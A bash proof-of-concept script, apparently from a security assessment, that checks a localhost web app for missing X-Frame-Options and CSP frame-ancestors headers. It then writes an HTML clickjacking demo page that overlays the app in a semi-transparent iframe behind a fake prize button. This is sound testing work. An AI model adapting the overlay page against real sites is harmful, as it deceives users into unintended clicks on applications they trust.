#!/bin/bash

# POC: Missing X-Frame-Options Header - Clickjacking Vulnerability
# Target: http://localhost:3000/

TARGET_URL="http://localhost:3000/"
echo "[*] Clickjacking Vulnerability POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: Check for X-Frame-Options header
echo "[*] Test 1: Checking for X-Frame-Options header..."
RESPONSE=$(curl -s -I "$TARGET_URL" 2>&1)

if echo "$RESPONSE" | grep -qi "x-frame-options"; then
    echo "[-] X-Frame-Options header is present:"
    echo "$RESPONSE" | grep -i "x-frame-options"
    echo "[!] Vulnerability may not be exploitable"
else
    echo "[+] X-Frame-Options header is MISSING - Vulnerable!"
fi

echo ""

# Test 2: Check for Content-Security-Policy frame-ancestors
echo "[*] Test 2: Checking for Content-Security-Policy frame-ancestors..."
if echo "$RESPONSE" | grep -qi "content-security-policy"; then
    CSP_HEADER=$(echo "$RESPONSE" | grep -i "content-security-policy")
    echo "[*] CSP Header found: $CSP_HEADER"
    if echo "$CSP_HEADER" | grep -qi "frame-ancestors"; then
        echo "[-] frame-ancestors directive is present"
        echo "$CSP_HEADER" | grep -i "frame-ancestors"
    else
        echo "[+] frame-ancestors directive is MISSING - Vulnerable!"
    fi
else
    echo "[+] Content-Security-Policy header is MISSING - Vulnerable!"
fi

echo ""
echo "[*] Full Response Headers:"
echo "$RESPONSE"

echo ""
echo "[*] Test 3: Creating HTML POC to demonstrate iframe embedding..."

# Create HTML POC file
HTML_POC="/tmp/clickjacking_poc.html"
cat > "$HTML_POC" << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking POC - Malicious Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
        }
        .attack-container {
            position: relative;
            width: 800px;
            height: 600px;
            border: 2px solid red;
        }
        iframe {
            position: absolute;
            width: 800px;
            height: 600px;
            opacity: 0.5; /* In real attack, this would be 0.0001 */
            z-index: 2;
        }
        .fake-button {
            position: absolute;
            top: 250px;
            left: 300px;
            z-index: 1;
            padding: 20px 40px;
            background-color: #4CAF50;
            color: white;
            font-size: 24px;
            border: none;
            cursor: pointer;
        }
        .warning {
            background-color: #ffcccc;
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid red;
        }
    </style>
</head>
<body>
    <div class="warning">
        <h2>⚠️ CLICKJACKING ATTACK DEMONSTRATION</h2>
        <p>This page demonstrates how an attacker could embed the vulnerable application in an iframe.</p>
        <p>In a real attack, the iframe would be invisible (opacity: 0.0001) and positioned over fake content.</p>
    </div>
    
    <h3>Malicious Page with Hidden Iframe:</h3>
    <div class="attack-container">
        <button class="fake-button">Click here to win $1000!</button>
        <iframe src="http://localhost:3000/" title="Hidden vulnerable app"></iframe>
    </div>
    
    <p><strong>Attack Scenario:</strong> Users think they're clicking the green button, but they're actually interacting with the hidden application in the iframe.</p>
</body>
</html>
EOF

echo "[+] HTML POC created at: $HTML_POC"
echo "[*] To test manually, open: file://$HTML_POC in a browser"

echo ""
echo "=== VULNERABILITY CONFIRMED ==="
echo "[+] The application is vulnerable to clickjacking attacks"
echo "[+] Missing security headers allow the application to be framed"
echo "[+] An attacker can create malicious pages that overlay the legitimate interface"